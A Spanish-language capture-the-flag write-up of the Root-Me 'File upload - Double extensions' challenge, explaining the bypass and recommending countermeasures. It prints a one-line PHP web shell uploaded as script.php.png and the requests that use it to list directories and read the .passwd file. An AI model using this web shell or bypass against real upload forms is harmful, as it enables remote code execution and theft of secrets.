Writeup: File Upload - Double Extensions (Root-Me CH20)
Información del Reto

    Nombre: File upload - Double extensions

    Plataforma: Root-Me

    Categoría: Web-Serveur

    Dificultad: 10%

    Puntos: 20

    Objetivo: Subir un archivo PHP mediante una vulnerabilidad de doble extensión y leer el archivo .passwd en la raíz de la aplicación

1. Análisis Inicial
1.1 Descripción del Reto

El reto consiste en una galería de fotos que permite subir archivos. El objetivo es hackear la galería subiendo código PHP para recuperar la contraseña de validación almacenada en el archivo .passwd.
1.2 Enunciado Original

    "Your goal is to hack this photo galery by uploading PHP code. Retrieve the validation password in the file .passwd at the root of the application."

1.3 Información del Desafío
text

Author: g0uZ, 24 December 2012
Level: 10%
Validations: 38134 Challengers
Votes: 1443

2. Reconocimiento
2.1 Identificación de la Vulnerabilidad

La aplicación permite subir archivos a través de un formulario. El título "Double Extensions" sugiere que el validador solo verifica la extensión final del archivo, mientras que el servidor (Apache) ejecutará el archivo según la primera extensión reconocible.

Vulnerabilidad:

    El validador solo mira la extensión final (ej: .png)

    El servidor Apache ejecuta archivos con extensión .php

    Un archivo con nombre shell.php.png pasa el validador pero es ejecutado como PHP

2.2 Prueba de Concepto

Subimos un archivo llamado script.php.png con el siguiente contenido:
php

<?php system($_GET['cmd']); ?>

Resultado de la subida:
text

Upload: script.php.png
Type: image/png
Size: 0.0302734375 kB
Stored in: ./galerie/upload/1d0547b9a048e1930c9a34f580fb51c3/script.php.png

3. Explotación
3.1 Verificación de Ejecución de Comandos

Primero verificamos que el código PHP se ejecute correctamente listando el directorio actual:

Petición:
text

http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/1d0547b9a048e1930c9a34f580fb51c3//script.php.png?cmd=ls%20-la

Respuesta:
text

total 284
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 12:29 .
drwxr-s--- 7 web-serveur-ch20 www-data 278528 Jul 16 12:29 ..
-rw-r--r-- 1 web-serveur-ch20 www-data 31 Jul 16 12:29 script.php.png

✅ Confirmación: El archivo se ejecuta como PHP y el comando ls -la funciona.
3.2 Exploración del Sistema de Archivos

Para encontrar el archivo .passwd, exploramos la estructura de directorios:

Petición:
text

http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/1d0547b9a048e1930c9a34f580fb51c3//script.php.png?cmd=ls%20-la%20../

Resultado:
text

total 304
drwxr-s--- 7 web-serveur-ch20 www-data 278528 Jul 16 12:29 .
drwxr-s--- 8 web-serveur-ch20 www-data 4096 Dec 12 2021 ..
-rw-r--r-- 1 root www-data 1 Jul 16 04:09 .gitkeep
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 12:29 1d0547b9a048e1930c9a34f580fb51c3
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 12:14 34793d08f1826b73aa70491908a52f61
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 10:40 7a6dbb59cc10bff463cc2ccfbc02024b
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 12:27 98f35a06a8395f42d169fd8789f98c3f
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 08:23 a01d09a136195f960cc9b371d00d83c4

3.3 Identificación de la Ubicación de .passwd

El archivo .passwd debe estar en la raíz de la aplicación. Usando /etc/passwd como referencia, identificamos que el usuario web-serveur-ch20 tiene su directorio en /challenge/web-serveur/ch20/.
3.4 Lectura del Archivo .passwd

Petición Final:
text

http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/1d0547b9a048e1930c9a34f580fb51c3//script.php.png?cmd=cat%20../../../.passwd

Respuesta:
text

****************************

4. Validación de la Contraseña

La contraseña obtenida es:
text

**************************

Esta es la contraseña de validación que debe ser ingresada en el campo correspondiente en Root-Me para completar el reto.
5. Análisis de la Vulnerabilidad
5.1 Causa Raíz

La aplicación valida los archivos basándose únicamente en la extensión del nombre del archivo, sin verificar el contenido real o el tipo MIME correctamente.
5.2 Flujo de Ataque
text

1. Usuario sube archivo malicioso: shell.php.png
   ↓
2. Validador ve extensión .png → Acepta el archivo
   ↓
3. Apache recibe petición por shell.php.png
   ↓
4. Apache mapea la extensión .php → Ejecuta como PHP
   ↓
5. El código PHP se ejecuta con permisos del servidor
   ↓
6. Se puede ejecutar comandos del sistema
   ↓
7. Lectura de archivos sensibles como .passwd

5.3 Contramedidas Recomendadas

    Validación de Tipo MIME: Verificar el tipo MIME real del archivo con finfo_file() o getimagesize()

    Validación de Contenido: Verificar la firma mágica del archivo (magic bytes)

    Cambiar Nombre del Archivo: Renombrar el archivo con un hash aleatorio sin extensión

    Restringir Ejecución: Configurar el directorio de uploads para no ejecutar scripts

    Sanitización de Nombres: Eliminar caracteres peligrosos y extensiones múltiples

6. Evidencia de Capturas
6.1 Captura de Subida del Archivo Malicioso
text

File information :
- Upload: script.php.png
- Type: image/png
- Size: 0.0302734375 kB
- Stored in: ./galerie/upload/1d0547b9a048e1930c9a34f580fb51c3/script.php.png

6.2 Captura de Ejecución de Comandos (ls -la)
text

total 284
drwxr-s--- 2 web-serveur-ch20 www-data 4096 Jul 16 12:29 .
drwxr-s--- 7 web-serveur-ch20 www-data 278528 Jul 16 12:29 ..
-rw-r--r-- 1 web-serveur-ch20 www-data 31 Jul 16 12:29 script.php.png

6.3 Captura de Lectura del Archivo .passwd
text

***************************

7. Conclusión

El reto demuestra cómo una validación deficiente de archivos subidos puede llevar a la ejecución remota de código (RCE). La técnica de "doble extensión" es un clásico ejemplo de cómo los atacantes pueden engañar a los validadores que no implementan verificaciones robustas de tipo MIME y contenido real.

Lecciones Aprendidas:

    Nunca confiar en la extensión del archivo para validar su tipo

    Implementar múltiples capas de validación (MIME, contenido, firma mágica)

    Almacenar archivos fuera del directorio web o con nombres no ejecutables

8. Referencias

    OWASP - Unrestricted File Upload

    Apache - AddHandler and AddType Directives

    Root-Me - File upload - Double extensions
